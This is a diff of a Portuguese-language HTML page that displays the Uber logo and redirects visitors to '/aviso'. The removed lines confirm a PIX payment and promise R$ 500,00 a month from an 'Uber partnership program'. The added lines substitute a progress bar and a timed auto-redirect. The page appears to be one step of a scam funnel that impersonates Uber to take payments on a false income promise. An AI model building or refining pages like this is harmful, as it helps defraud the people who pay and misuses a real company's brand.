@@ -97,27 +97,16 @@
 <body class="min-h-screen flex items-center justify-center p-5">
     <div class="container text-center fade-in">
         <!-- Logo Uber oficial -->
-        <div class="mb-6">
-            <img src="https://i.ibb.co/wFFn5HSn/13093103960002-1.png" alt="Uber" class="h-12 mx-auto">
+        <div class="mb-8">
+            <img src="https://i.ibb.co/wFFn5HSn/13093103960002-1.png" alt="Uber" class="h-16 mx-auto">
         </div>
         
-        <div class="success-icon">✅</div>
-        <h1 class="max-w-xs mx-auto" style="color: #fff !important;">PIX Confirmado com Sucesso!</h1>
-        <p class="mb-4 max-w-sm mx-auto" style="color: #fff !important;">Seu pagamento foi processado.</p>
-        <p class="mb-6 max-w-sm mx-auto" style="color: #fff !important;">Ativando programa de parceria Uber...</p>
-        
-        <div class="uber-spinner"></div>
-        
-        <div class="bg-gray-900 border border-gray-700 rounded-lg p-4 mb-6">
-            <p class="text-sm font-medium" style="color: #00D494 !important;">
-                <i class="fa fa-check-circle mr-2" style="color: #00D494 !important;"></i>
-                Você receberá R$ 500,00 mensais
-            </p>
+        <!-- Progress Bar -->
+        <div class="w-64 mx-auto">
+            <div class="bg-gray-700 rounded-full h-2">
+                <div id="progress-bar" class="bg-white h-2 rounded-full transition-all duration-4000" style="width: 0%"></div>
+            </div>
         </div>
-        
-        <button class="redirect-btn" onclick="window.location.href='/aviso'">
-            Continuar para Ativação
-        </button>
     </div>
     
     <script>
@@ -132,10 +121,15 @@
             document.head.appendChild(style);
         });
         
-        // Redirecionamento automático em 3 segundos
+        // Animate progress bar
+        setTimeout(() => {
+            document.getElementById('progress-bar').style.width = '100%';
+        }, 100);
+        
+        // Redirecionamento automático em 4 segundos
         setTimeout(() => {
             window.location.href = '/aviso';
-        }, 3000);
+        }, 4000);
     </script>
 </body>
 </html>
